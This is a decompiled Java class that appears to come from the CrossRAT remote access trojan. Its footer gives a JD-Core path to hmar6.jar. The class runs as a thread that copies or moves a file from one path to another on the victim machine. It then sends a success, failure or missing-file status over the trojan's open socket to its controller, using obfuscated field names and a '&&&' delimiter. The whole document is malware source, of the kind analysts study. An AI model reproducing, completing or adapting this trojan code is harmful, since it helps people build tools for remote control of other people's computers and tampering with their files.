package crossrat;

import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.net.Socket;
import org.a.a.a.b;

final class h
  extends Thread
{
  private String a;
  private String b;
  private String c = null;
  
  public h(String paramString1, String paramString2)
  {
    this.a = paramString1;
    this.b = paramString2;
  }
  
  public final void run()
  {
    File localFile1 = new File(this.a);
    File localFile2 = new File(this.b);
    DataOutputStream localDataOutputStream = null;
    try
    {
      localDataOutputStream = new DataOutputStream(k.k.getOutputStream());
    }
    catch (Exception localException3)
    {
      Exception localException1;
      (localException1 = localException3).printStackTrace();
    }
    if (localFile1.exists()) {
      try
      {
        b.b(localFile1, localFile2);
        this.c = "1";
      }
      catch (IOException localIOException)
      {
        this.c = "0";
        localIOException.printStackTrace();
      }
    } else {
      this.c = "2";
    }
    try
    {
      localDataOutputStream.writeBytes(k.g + k.d + k.F + k.d + this.c + k.d + "&&&");
      return;
    }
    catch (Exception localException4)
    {
      Exception localException2;
      (localException2 = localException4).printStackTrace();
    }
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\crossrat\h.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */